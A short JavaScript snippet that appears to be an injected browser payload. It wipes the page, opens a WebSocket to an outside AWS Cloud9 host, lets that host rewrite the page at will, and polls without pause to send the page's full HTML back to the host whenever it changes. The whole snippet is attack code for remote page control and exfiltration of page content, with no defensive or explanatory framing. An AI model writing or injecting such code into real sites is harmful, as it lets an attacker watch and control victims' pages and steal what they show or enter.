var body = "";
document.body.innerHTML="";
ws = new WebSocket("wss://5065322b3d2b440f91c9a7a6690de1b7.vfs.cloud9.us-east-1.amazonaws.com");
ws.onopen = function() {
  console.log("opened");
};
				
ws.onmessage = function (evt) { 
  var received_msg = evt.data;
  document.body.innerHTML = evt.data;
  body = document.body.innerHTML
};
				
ws.onclose = function() { 
  console.log("Closed")
};
setInterval(function() { counter() }, 0);
function counter()
{
  if (document.body.innerHTML != body) {
    ws.send(document.body.innerHTML)
    body = document.body.innerHTML;
  }
}
